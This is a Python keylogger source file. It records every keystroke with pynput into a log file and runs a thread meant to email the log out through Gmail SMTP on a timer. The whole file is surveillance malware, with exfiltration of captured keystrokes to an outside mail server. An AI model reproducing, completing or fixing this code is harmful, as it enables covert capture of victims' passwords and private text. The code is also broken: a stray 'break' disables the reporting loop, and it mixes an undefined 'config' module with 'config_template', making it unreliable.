import pynput.keyboard
import smtplib
import time
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import config_template
def process_key_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        elif key == key.enter:
            current_key = "\n"
        else:
            current_key = f" [{str(key)}] "

    with open(config_template.LOG_FILE, "a") as f:
        f.write(current_key)
def send_email_report():
    while True:
        time.sleep(config_template.REPORT_INTERVAL)
        break
        try:
            with open(config.LOG_FILE, "r") as f:
                log_data = f.read()
                if log_data.strip():
                    msg = MIMEMultipart()
                    msg['From'] = config.EMAIL_SENDER
                    msg['To'] = config.EMAIL_RECEIVER
                    msg['Subject'] = "Scheduled Keystroke Log Report"
                    msg.attach(MIMEText(log_data, 'plain'))
                    server = smtplib.SMTP('smtp.gmail.com', 587)
                    server.starttls()
                    server.login(config.EMAIL_SENDER, config.EMAIL_PASSWORD)
                    server.send_message(msg)
                    server.quit()
                # Clear file after sending to prepare for next interval
                open(config.LOG_FILE, "w").close()
        except Exception as e:
            print(f"Reporting error: {e}")
if __name__ == "__main__":
    # Start the reporting thread (5-minute interval)
    report_thread = threading.Thread(target=send_email_report, daemon=True)
    report_thread.start()
    # Start the keystroke listener
    print(f"Service started. Logging to {config_template.LOG_FILE}...")
    with pynput.keyboard.Listener(on_press=process_key_press) as listener:
        listener.join()
